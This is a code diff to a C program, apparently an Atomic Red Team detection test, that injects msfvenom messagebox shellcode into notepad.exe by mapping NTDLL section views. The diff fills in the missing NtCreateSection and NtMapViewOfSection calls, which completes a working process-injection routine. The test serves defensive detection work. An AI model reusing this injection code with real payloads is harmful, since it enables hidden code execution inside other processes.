@@ -7,7 +7,6 @@
 #include <windows.h>
 #include <stdio.h>
 #include <tlhelp32.h>
-#include <winternl.h>
 
 // msfvenom -a x64 --platform windows -p windows/x64/messagebox TEXT="Atomic Red Team" -f csharp
 unsigned char shellcode[] = {0xfc,0x48,0x81,0xe4,0xf0,0xff,
@@ -66,7 +65,7 @@ typedef FARPROC (WINAPI * RtlCreateUserThread_t)(
     IN PVOID StartAddress,
     IN PVOID StartParameter OPTIONAL,
     OUT PHANDLE ThreadHandle,
-    OUT PCLIENT_ID ClientId);
+    OUT PCLIENT_ID ClientID);
 
 typedef NTSTATUS (NTAPI * NtCreateThreadEx_t)(
     OUT PHANDLE hThread,
@@ -182,13 +181,15 @@ int InjectView(HANDLE hProc, unsigned char * shellcode, unsigned int shellcode_l
     // Create a section object in the current process
     NtCreateSection_t pNtCreateSection = (NtCreateSection_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtCreateSection");
     if(pNtCreateSection == NULL) return -2;
+	pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER) &shellcode_len, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
 
     // Create the local view in the current process
     NtMapViewOfSection_t pNtMapViewOfSection = (NtMapViewOfSection_t) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtMapViewOfSection");
     if (pNtMapViewOfSection == NULL) return -2;
+	pNtMapViewOfSection(hSection, GetCurrentProcess(), &pLocalView, NULL, NULL, NULL, (SIZE_T *) &shellcode_len, ViewUnmap, NULL, PAGE_READWRITE);
 
     // Copy the shellcode in the local section view
-    memcpy(pLocalView, shellcode, shellcode_len);
+    CopyMemory(pLocalView, shellcode, shellcode_len);
 
     // Create a remote sectin view in the target process
     pNtMapViewOfSection(hSection, hProc, &pRemoteView, NULL, NULL, NULL, (SIZE_T *) &shellcode_len, ViewUnmap, NULL, PAGE_EXECUTE_READ);
@@ -215,6 +216,7 @@ int main(int argc, char *argv[]) {
     pid = FindProcess("notepad.exe");
 
     if(pid) {
+        printf("Notepad.exe found!\n");
         hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, pid);
 
         if(hProc != NULL) {
